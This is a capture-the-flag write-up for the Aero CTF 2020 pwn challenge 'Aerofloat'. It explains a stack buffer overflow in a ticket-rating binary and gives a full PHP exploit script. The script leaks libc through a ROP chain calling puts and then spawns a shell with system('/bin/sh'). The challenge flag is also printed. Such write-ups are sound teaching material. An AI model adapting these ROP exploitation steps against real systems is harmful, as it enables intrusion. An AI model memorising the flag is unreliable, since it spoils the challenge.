# Aerofloat - Aero CTF 2020 (pwn, 100p, 63 solved)
## Introduction

Aerofloat is a pwn task.

An archive containing a binary, a libc and its corresponding loader (`ld.so`).

It allows a user to input a list of rating for tickets by id.

## Reverse engineering

The binary is very small. It contains a menu interface in which a user can
insert a rating for a ticket. The binary sets an alarm that kills it 5 seconds
after it is started.

When a user rates a ticket, it is added in a structure on the stack. This
structure looks like this :

```c
struct ticket {
	char   id[8];
	double rating;
};
```

The ratings are added on a fixed-size array on the stack. There is no canary. It
is possible to overflow this array of size 8 and overwrite the return address.

## Exploitation

The array that contains tickets is located at offset `0xC8`. The structure
contains two fields of size 8. As a result, its size is `0x10`.

It is possible to overwrite the return address by creating `0x0C` == `12`
tickets. The return address will be overwritten by the next ticket's `rating`
field.

There is a small caveat: `rating` is a `double`. As a result, it is necessary to
encode the return address according to the IEEE 754 standard. PHP's `unpack`
function can handle this with `unpack("d", $n)`.

The easiest and most reliable way to exploit this binary is to use a ROP chain
that calls `puts` or `printf` on an address stored in the `.got.plt` section to
leak the libc and return to main. A second ROP chain can then be used to call
`system("/bin/sh")`.

**Flag**: `Aero{8c911e90f6ff8ecb6a333ebacfccd28b36d1f9b02386cc884b343f1f02da62e6}`

## Appendices

### pwn.php

```php
#!/usr/bin/php
<?php
require_once("Socket.php");

function menu(Tube $t)
{
	$t->expectLine("1. Set rating");
	$t->expectLine("2. View rating list");
	$t->expectLine("3. View porfile info");
	$t->expectLine("4. Exit");
	$t->expect("> ");
}

function add(Tube $t, $name, $rating)
{
	menu($t);
	$t->write("1\n");

	$t->expect("{?} Enter your ticket id: ");
	$t->write("$name");

	$t->expect("{?} Enter your rating: ");
	$t->write("$rating\n");

	return $t->readLine();
}

$t = new Socket("tasks.aeroctf.com", 33017);

$t->expect("{?} Enter name: ");
$t->write("[TFNS] XeR\n");

printf("[+] Overflow the stack\n");
for($i = 0; $i < 12; $i++)
	add($t, "$i\0", $i);



$chain = array(
	0x004015bb, 0x00404018, // pop rdi (puts)
	0x00401030, // puts
	0x00401192, // main
);

$chain = array_merge([0xCAFEBABE], $chain);
if(sizeof($chain) % 2)
	$chain[] = 0xdeadbeef;


for($i = 0; $i < sizeof($chain); $i += 2) {
	$str   = pack("Q", $chain[$i + 0]);
	$float = unpack("d", pack("Q", $chain[$i + 1]))[1];

	add($t, $str, $float);
}

menu($t);
$t->write("4\n");

$leak = $t->readLine();
$leak = substr(str_pad($leak, 8, "\x00"), 0, 8);
$libc = unpack("Q", $leak)[1] - 0x7FFFF7E82050 + 0x7ffff7e0e000;
printf("[+] libc: %X\n", $libc);


$t->expect("{?} Enter name: ");
$t->write("[TFNS] XeR\n");

printf("[+] Overflow the stack\n");
for($i = 0; $i < 12; $i++)
	add($t, "$i\0", $i);

$chain = array(
	0x004015bb, $libc + 0x183cee, // pop rdi ("/bin/sh")
	$libc + 0x00046ff0, // system
);

$chain = array_merge([0xCAFEBABE], $chain);
if(sizeof($chain) % 2)
	$chain[] = 0xdeadbeef;


for($i = 0; $i < sizeof($chain); $i += 2) {
	$str   = pack("Q", $chain[$i + 0]);
	$float = unpack("d", pack("Q", $chain[$i + 1]))[1];

	add($t, $str, $float);
}

menu($t);
$t->write("4\n");

printf("[+] Pipe\n");
$t->pipe();
```
